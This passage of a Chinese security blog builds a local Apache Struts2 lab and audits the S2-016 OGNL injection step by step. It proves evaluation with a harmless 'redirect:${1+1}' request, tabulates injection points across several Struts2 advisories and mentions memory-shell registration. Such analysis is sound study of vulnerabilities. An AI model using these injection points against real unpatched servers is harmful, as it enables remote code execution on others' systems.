+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">请求 /index.action</span><br><span class="line">        ↓</span><br><span class="line">Struts2 找到对应的 HelloAction</span><br><span class="line">        ↓</span><br><span class="line">自动把 URL 参数绑定到字段（OGNL 做的）</span><br><span class="line">        ↓</span><br><span class="line">调用 execute()</span><br><span class="line">        ↓</span><br><span class="line">返回 &quot;success&quot;</span><br><span class="line">        ↓</span><br><span class="line">跳转到 index.jsp</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>第二个：struts.xml</strong></p>
+<p>在 <code>src/main/resources</code> 下新建 <code>struts.xml</code>：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">struts</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;index&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.HelloAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>解释一下各属性：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;package name=&quot;default&quot; namespace=&quot;/&quot; extends=&quot;struts-default&quot;&gt;</span><br><span class="line"></span><br><span class="line">name=&quot;default&quot;           →  这个包的名字，随便起，唯一就行</span><br><span class="line">namespace=&quot;/&quot;            →  URL 命名空间，/ 表示根路径</span><br><span class="line">                            访问 /index.action 而不是 /demo/index.action</span><br><span class="line">extends=&quot;struts-default&quot; →  继承 Struts2 内置的默认包</span><br><span class="line">                            里面预置了所有拦截器和结果类型</span><br><span class="line">                            包括处理 redirect: 的结果类型也在这里</span><br><span class="line"></span><br><span class="line">&lt;action name=&quot;index&quot; class=&quot;com.demo.HelloAction&quot;&gt;</span><br><span class="line"></span><br><span class="line">name=&quot;index&quot;                 →  对应 URL 里的 index.action</span><br><span class="line">class=&quot;com.demo.HelloAction&quot; →  请求来了实例化这个类处理</span><br><span class="line"></span><br><span class="line">&lt;result name=&quot;success&quot;&gt;/index.jsp&lt;/result&gt;</span><br><span class="line"></span><br><span class="line">name=&quot;success&quot;  →  对应 execute() 返回的字符串 &quot;success&quot;</span><br><span class="line">/index.jsp      →  返回 success 就跳转到这个页面</span><br></pre></td></tr></table></figure>
+
+<p><strong>和 S2-016 漏洞的关系：</strong></p>
+<p><code>extends=&quot;struts-default&quot;</code> 这行是关键，<code>struts-default</code> 里预置了 <code>redirect</code> 结果类型：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- struts-default.xml 里内置的，我们看不到但它存在 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">result-type</span> <span class="attr">name</span>=<span class="string">&quot;redirect&quot;</span></span></span><br><span class="line"><span class="tag">             <span class="attr">class</span>=<span class="string">&quot;org.apache.struts2.dispatcher.ServletRedirectResult&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用户请求 <code>?redirect:$&#123;...&#125;</code> 的时候，Struts2 识别 <code>redirect:</code> 前缀，调用 <code>ServletRedirectResult</code> 处理，然后把后面的 <code>$&#123;...&#125;</code> 丢给 OGNL 执行，漏洞就在这里触发。</p>
+<p>所以这个配置文件看起来没问题，但继承了 <code>struts-default</code> 就自动带进来了漏洞的触发路径。</p>
+<hr>
+<p><strong>第三个：web.xml</strong></p>
+<p>在 <code>src/main/webapp/WEB-INF</code> 下找到 <code>web.xml</code>，内容换成：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee</span></span></span><br><span class="line"><span class="string"><span class="tag">         http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;3.1&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>没有这个 Filter，Struts2 根本不工作，它是整个框架的入口，所有请求都从这里过。</p>
+<hr>
+<p><strong>第四个：index.jsp</strong></p>
+<p><code>src/main/webapp/index.jsp</code> 内容换成：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Hello, $&#123;name&#125;&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="验证漏洞触发"><a href="#验证漏洞触发" class="headerlink" title="验证漏洞触发"></a>验证漏洞触发</h3><p>四个文件建好之后启动 Tomcat，访问 <code>http://localhost:8080/index.action</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_qaj3.png"></p>
+<p>访问 <code>http://localhost:8080/index.action?name=wrold</code>，返回 <code>Hello, wrold</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_ly5t.png"></p>
+<p>然后试试触发 OGNL 表达式，访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/index.action?redirect:$&#123;1+1&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_flt6.png"></p>
+<p>发现返回的是 <strong>HTTP 400 – Bad Request</strong>，原因是 Tomcat 在解析请求行时发现里面有非法字符（冒号、花括号、加号），根据 RFC 7230 和 RFC 3986，这些字符在查询参数里必须经过百分号编码。</p>
+<p>把 URL 里的特殊字符编码后再访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/index.action?redirect%3A%24%7B1%2B1%7D</span><br></pre></td></tr></table></figure>
+
+<p>返回的是 404”Not Found”（资源不存在）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_n8yc.png"></p>
+<p>但注意到 URL 路径变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/2</span><br></pre></td></tr></table></figure>
+
+<p>说明内部已经解析了参数 <code>redirect:$&#123;1+1&#125;</code>：</p>
+<ul>
+<li>框架识别了 <code>redirect:</code> 前缀</li>
+<li>框架对 <code>$&#123;1+1&#125;</code> 进行了表达式求值（OGNL）</li>
+<li>服务器发送了 302 重定向响应，客户端自动跳转到 <code>/2</code></li>
+<li>然后客户端去访问 <code>http://localhost:8080/2</code>，而这个资源不存在，所以最终返回 404</li>
+</ul>
+<p><strong>OGNL 已经执行了，只是结果被用作重定向目标，后面代码审计会看得很清楚。</strong></p>
+<hr>
+<h3 id="Struts2-完整请求流程"><a href="#Struts2-完整请求流程" class="headerlink" title="Struts2 完整请求流程"></a>Struts2 完整请求流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">请求 /index.action?name=张三</span><br><span class="line">        ↓</span><br><span class="line">Filter 拦截（StrutsPrepareAndExecuteFilter）</span><br><span class="line">        ↓</span><br><span class="line">根据 struts.xml 找到 HelloAction</span><br><span class="line">        ↓</span><br><span class="line">实例化 HelloAction 对象</span><br><span class="line">        ↓</span><br><span class="line">【参数绑定】</span><br><span class="line">遍历所有 URL 参数</span><br><span class="line">对每个参数名用 OGNL 执行：HelloAction.setName(&quot;张三&quot;)</span><br><span class="line">        ↓</span><br><span class="line">执行 execute()</span><br><span class="line">        ↓</span><br><span class="line">返回 success 跳转 index.jsp</span><br><span class="line">        ↓</span><br><span class="line">JSP 里 $&#123;name&#125; 用 OGNL 调用 HelloAction.getName()</span><br><span class="line">        ↓</span><br><span class="line">显示 张三</span><br></pre></td></tr></table></figure>
+
+<p>所以本质上就是 <strong>Struts2 把每个 URL 参数名当成 OGNL 表达式执行了一遍</strong>，这也是早期 S2-003&#x2F;S2-005 漏洞的根源——参数名本身就能注入 OGNL。</p>
+<hr>
+<h2 id="八、代码审计"><a href="#八、代码审计" class="headerlink" title="八、代码审计"></a>八、代码审计</h2><p>环境搭好了，开始看代码是怎么走的。</p>
+<p>没有源代码的话可以去 Maven 中央仓库下载：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://repo1.maven.org/maven2/org/apache/struts/struts2-core/2.3.15/struts2-core-2.3.15-sources.jar</span><br></pre></td></tr></table></figure>
+
+<h3 id="入口：StrutsPrepareAndExecuteFilter"><a href="#入口：StrutsPrepareAndExecuteFilter" class="headerlink" title="入口：StrutsPrepareAndExecuteFilter"></a>入口：StrutsPrepareAndExecuteFilter</h3><p>先根据 <code>web.xml</code> 里的 <code>StrutsPrepareAndExecuteFilter</code> 找到源文件，在 <code>doFilter</code> 打个断点：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_1l44.png"></p>
+<p>这里面出现了大量 <code>prepare</code> 字段，简单解释一下，就是 Filter 里的两个阶段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">doFilter()</span><br><span class="line">    ↓</span><br><span class="line">prepare.wrapRequest()        ← Prepare 阶段</span><br><span class="line">  - 初始化 ActionContext</span><br><span class="line">  - 把 request/response/session 塞进 OGNL context</span><br><span class="line">  - 解析请求参数，绑定到 Action 字段</span><br><span class="line">        ↓</span><br><span class="line">execute.executeAction()      ← Execute 阶段</span><br><span class="line">  - 根据 struts.xml 找 Action</span><br><span class="line">  - 实例化 Action 类</span><br><span class="line">  - 调用 execute() 方法</span><br><span class="line">  - 处理返回结果（redirect/dispatcher）</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="executeAction-与-ActionMapping"><a href="#executeAction-与-ActionMapping" class="headerlink" title="executeAction 与 ActionMapping"></a>executeAction 与 ActionMapping</h3><p>重点在 <code>execute.executeAction</code> 方法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_f3uh.png"></p>
+<p>除了 <code>Request</code> 和 <code>Response</code> 参数，还有一个 <code>mapping</code> 参数，可以看到参数里面的内容：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_m6r3.png"></p>
+<p><code>mapping</code> 是 <code>ActionMapping</code> 对象，存的是 Struts2 解析完 URL 之后得到的路由信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">请求 /index.action?redirect:$&#123;1+1&#125;</span><br><span class="line">        ↓</span><br><span class="line">Struts2 解析 URL</span><br><span class="line">        ↓</span><br><span class="line">ActionMapping &#123;</span><br><span class="line">    name      = &quot;index&quot;               ← action 名字</span><br><span class="line">    namespace = &quot;/&quot;                   ← 命名空间</span><br><span class="line">    method    = &quot;null&quot;                ← 没指定方法，默认用 execute()</span><br><span class="line">    extension = &#x27;action&#x27;              ← 后缀是 .action</span><br><span class="line">    result    = ServletRedirectResult ← 识别出 redirect: 前缀，指定了结果处理类</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="struts-default-xml-与各版本注入点"><a href="#struts-default-xml-与各版本注入点" class="headerlink" title="struts-default.xml 与各版本注入点"></a>struts-default.xml 与各版本注入点</h3><p>这个文件在 <code>struts2-core.jar</code> 包里，框架自带的：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_3n63.png"></p>
+<p><code>struts.xml</code> 里写了 <code>extends=&quot;struts-default&quot;</code>，就把这些内置 result 类型全部继承过来了，所以 Struts2 解析到 <code>redirect:</code> 前缀的时候，直接查这个表找到对应的 <code>ServletRedirectResult</code> 类。</p>
+<p><code>redirect:</code> 只是其中一个注入点，Struts2 历史上被找到的注入点非常多：</p>
+<table>
+<thead>
+<tr>
+<th>版本</th>
+<th>注入点</th>
+<th>Payload 特征</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>S2-003&#x2F;005</td>
+<td>参数名本身</td>
+<td><code>?(%27%23_memberAccess...)=xxx</code></td>
+</tr>
+<tr>
+<td>S2-016</td>
+<td><code>redirect:</code>&#x2F;<code>redirectAction:</code> 前缀</td>
+<td><code>?redirect:$&#123;...&#125;</code></td>
+</tr>
+<tr>
+<td>S2-032</td>
+<td><code>method:</code> 前缀</td>
+<td><code>?method:$&#123;...&#125;</code></td>
+</tr>
+<tr>
+<td>S2-045</td>
+<td>Content-Type 请求头</td>
+<td>multipart 解析时触发</td>
+</tr>
+<tr>
+<td>S2-046</td>
+<td>Content-Disposition 的 filename 字段</td>
+<td>multipart 解析时触发</td>
+</tr>
+<tr>
+<td>S2-052</td>
+<td>请求 body（XML 反序列化）</td>
+<td>REST 插件解析 XML 时触发</td>
+</tr>
+<tr>
+<td>S2-057</td>
+<td>namespace</td>
+<td>URL 路径本身被当 OGNL 执行</td>
+</tr>
+</tbody></table>
+<p>规律就一条：<strong>凡是用户能控制的输入，被 Struts2 拿去做了 OGNL 求值，就是漏洞。</strong></p>
+<p>从 URL 参数名、参数值前缀、请求头、请求体、文件名、命名空间，基本上能想到的地方都被找过一遍了，这也是为什么 Struts2 漏洞那么多，根本原因是框架过度依赖 OGNL，到处都在求值。</p>
+<hr>
+<h3 id="顺着调用链往下走"><a href="#顺着调用链往下走" class="headerlink" title="顺着调用链往下走"></a>顺着调用链往下走</h3><p>进入 <code>executeAction</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_n0ey.png"></p>
+<p>可以看到 <code>dispatcher.serviceAction(request, response, servletContext, mapping)</code> 里多了个 <code>servletContext</code>，非常眼熟——内存马那里见过：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Listener 内存马里静态注册用到过</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">context.addFilter(...)    ← 动态注册 Filter</span><br><span class="line">context.addServlet(...)   ← 动态注册 Servlet</span><br></pre></td></tr></table></figure>
+
+<p>进入 <code>createContextMap</code>，可以看到 URL 里面的 <code>redirect:$&#123;1+1&#125;</code> 被传入了参数 <code>params</code>，其他变量都是空的：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_bluy.png"></p>
+<p>这也意味着请求的数据里有很多都会经过这个处理，都有可能成为注入点。</p>
+<p>接着进入 <code>createContextMap</code> 构造 <code>extraContext</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_rasc.png"></p>
+<p>在这个构造参数里，可以看到非常多的 <code>put</code> 方法，把各种对象塞进 Map，也就是把 <code>request/response/session</code> 塞进 OGNL context 的地方。这个 Map <code>extraContext</code> 最终就是 OGNL 的 context，所以 Payload 里才能用 <code>#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;)</code> 取出 response 对象。</p>
+<p>进一步跟进，发现 map 里面的参数被取出，加上有表达式的 OGNL context <code>extraContext</code> 一起被封装到了一个代理里面：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_bgia.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">createActionProxy(</span><br><span class="line">    namespace,    // 命名空间 &quot;/&quot;</span><br><span class="line">    name,         // action 名字 &quot;index&quot;</span><br><span class="line">    method,       // 方法名 null（默认 execute）</span><br><span class="line">    extraContext, // OGNL context，塞了 request/response 等</span><br><span class="line">    true,         // executeResult，是否执行 result</span><br><span class="line">    false         // cleanupContext，是否清理 context</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>接下来在这里检测 <code>redirect</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mapping.getResult() 拿到的就是之前在 ActionMapping 里看到的：</span><br><span class="line">result = org.apache.struts2.dispatcher.ServletRedirectResult</span><br></pre></td></tr></table></figure>
+
+<p>Struts2 在解析 URL 的时候就已经识别了 <code>redirect:</code> 前缀，把 <code>ServletRedirectResult</code> 存进了 <code>mapping</code>，现在这里把它取出来直接执行：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_r90j.png"></p>
+<p><code>result.execute()</code> → <code>super.execute()</code>，这里调用父类的 <code>execute</code>，可以看到继承的是 <code>StrutsResultSupport</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_ohey.png"></p>
+<p>在 <code>StrutsResultSupport.execute()</code> 里看到一个 <code>location</code> 变量，值是 <code>$&#123;1+1&#125;</code>，这个时候表达式已经被提取出来了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_wzt1.png"></p>
+<p>具体的截取逻辑在 <code>DefaultActionMapper</code> 里面：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_0vgq.png"></p>
+<p>常量 <code>REDIRECT_PREFIX</code>，值是 <code>&quot;redirect:&quot;</code>，就是处理 <code>redirect:</code> 前缀的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">put(REDIRECT_PREFIX, <span class="keyword">new</span> <span class="title class_">ParameterAction</span>() &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String key, ActionMapping mapping)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ServletRedirectResult</span> <span class="variable">redirect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRedirectResult</span>();</span><br><span class="line">        container.inject(redirect);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 直接截取 redirect: 后面的内容</span></span><br><span class="line">        <span class="comment">// key = &quot;redirect:$&#123;1+1&#125;&quot;</span></span><br><span class="line">        <span class="comment">// substring 之后 location = &quot;$&#123;1+1&#125;&quot;</span></span><br><span class="line">        <span class="comment">// 没有任何过滤，原封不动</span></span><br><span class="line">        redirect.setLocation(key.substring(REDIRECT_PREFIX.length()));</span><br><span class="line"></span><br><span class="line">        mapping.setResult(redirect);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>把未经过滤的用户输入存进 <code>ServletRedirectResult.location</code>，再存进 <code>ActionMapping</code>，后面取出来直接丢给 OGNL 执行。</p>
+<hr>
+<h3 id="核心触发：conditionalParse-→-OGNL-执行"><a href="#核心触发：conditionalParse-→-OGNL-执行" class="headerlink" title="核心触发：conditionalParse → OGNL 执行"></a>核心触发：conditionalParse → OGNL 执行</h3><p>父类的 <code>execute</code> 里面：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lastFinalLocation = conditionalParse(location, invocation);</span><br></pre></td></tr></table></figure>
+
+<p>这行是重点：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_5nm9.png"></p>
+<p><code>invocation</code> 是 <code>ActionInvocation</code> 对象，和之前的 <code>ActionProxy</code> 有关，里面有各种参数和环境。</p>
+<p><code>conditionalParse</code> 方法就在下面：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_stri.png"></p>
+<p><code>parse</code> 是 <code>StrutsResultSupport</code> 的一个成员变量，默认值是 <code>true</code>，这个条件默认就满足。<code>parse</code> 这个开关本来是给开发者用的，表示”是否解析表达式”，但默认是 <code>true</code>，而且用户输入没有经过任何过滤就到了这里，所以等于把 RCE 的大门直接敞开了。</p>
+<p>进入 <code>TextParseUtil.translateVariables</code>（源码在 xwork-core 里）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://repo1.maven.org/maven2/org/apache/struts/xwork/xwork-core/2.3.15.1/xwork-core-2.3.15.1-sources.jar</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_gtal.png"></p>
+<p><code>expression</code> 就是表达式 <code>$&#123;1+1&#125;</code>。<code>translateVariables</code> 方法里的第一个参数是一个数组，包含 <code>%</code> 和 <code>$</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">char</span>[]&#123;<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这说明 Struts2 同时支持两种表达式语法：</p>
+<ul>
+<li><code>$&#123;&#125;</code> → 标准 OGNL 表达式，S2-016 用这个</li>
+<li><code>%&#123;&#125;</code> → 同样是 OGNL 表达式，S2-045 的 Payload 用这个</li>
+</ul>
+<p>两个符号都会被识别然后丢给 OGNL 执行，所以 S2-045 的 Payload 里用 <code>%&#123;...&#125;</code> 也能触发，根本原因就在这里。</p>
+<p>然后经过几个构造方法来到最后一个：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_kp23.png"></p>
+<p>这个就是核心的漏洞触发代码：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_y8yt.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> parser.evaluate(openChars, expression, ognlEval, maxLoopCount);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>openChars</code> → <code>&#123;&#39;$&#39;, &#39;%&#39;&#125;</code>，告诉 parser 要识别这两种符号</li>
+<li><code>expression</code> → <code>&quot;$&#123;1+1&#125;&quot;</code>，要扫描的完整字符串</li>
+<li><code>ognlEval</code> → 回调函数，parser 提取完内容之后调用它执行 OGNL</li>
+<li><code>maxLoopCount</code> → 最大循环次数，防止死循环，比如 <code>$&#123;$&#123;1+1&#125;&#125;</code> 这种嵌套表达式</li>
+</ul>
+<p><code>evaluate</code> 方法就是匹配字符的逻辑：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_a6x4.png"></p>
+<p>这个机制让我想到了之前看过的 Log4j 的代码——类似 <code>%&#123;&quot;$&quot;&#125;&#123;1+1&#125;</code> 这种，第一次解析变成 <code>$&#123;1+1&#125;</code> 然后再次解析，两者思路是一样的。</p>
+<p>第三个参数 <code>ognlEval</code> 是 <code>ParsedValueEvaluator</code> 对象，里面的 <code>Object o = stack.findValue(parsedValue, asType)</code> 是执行表达式的最终地方。</p>
+<p>在 <code>evaluate</code> 里：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_uezw.png"></p>
